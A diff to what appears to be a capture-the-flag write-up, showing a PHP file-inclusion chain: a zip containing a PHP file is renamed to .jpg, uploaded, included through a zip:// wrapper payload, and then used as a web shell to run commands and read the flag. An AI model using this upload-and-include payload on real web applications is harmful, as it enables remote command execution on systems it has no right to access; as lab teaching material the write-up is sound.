@@ -48,7 +48,7 @@ and rename it to foo.jpg :
 > mv foo.zip foo.jpg
 
 and finally after uploading the foo.jpg file our payload will be :
->/?page=zip://uploads/foo.jpg%23foo.php
+>/?page=zip://uploads/foo.jpg%23foo
 
 Now the foo.php will be unzipped and we will have the possibility to execute any command with 
 >foo.php?command=YourCommandHere(ls first to list all files and then cat the flag file)
